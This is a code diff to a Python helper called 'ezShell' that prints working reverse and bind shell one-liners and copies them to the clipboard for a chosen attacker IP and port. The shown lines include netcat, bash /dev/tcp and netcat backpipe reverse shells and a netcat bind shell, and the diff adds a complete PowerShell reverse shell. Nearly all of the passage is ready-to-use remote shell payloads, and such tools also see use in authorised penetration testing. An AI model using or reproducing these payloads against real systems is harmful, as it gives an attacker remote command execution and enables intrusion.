@@ -47,7 +47,7 @@ def ezShell():
         pyperclip.copy(f"nc -e /bin/sh {attackerIP} {port}")
     elif language == "nc":
         print(f"[+] Netcat without the -e option:\n mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
-        pyperclip.copy(f"mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
+        pyperclip.copy(f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
     elif language == "ncb":
         print(f"[+] Netcat bind shell:\n nc -vlp 5555 -e /bin/bash")
         pyperclip.copy(f"nc -vlp 5555 -e /bin/bash")
@@ -57,6 +57,9 @@ def ezShell():
     elif language == "bash":
         print(f"[+] Bash reverse shell:\n bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1")
         pyperclip.copy(f"bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1")
+    elif language == "ps":
+        print("[+] Powershell reverse shell:\n $client = New-Object System.Net.Sockets.TCPClient(" + attackerIP + "," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
+        pyperclip.copy("$client = New-Object System.Net.Sockets.TCPClient(" + attackerIP + "," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
     else:
         print("Try another language, or check for typos.")
 
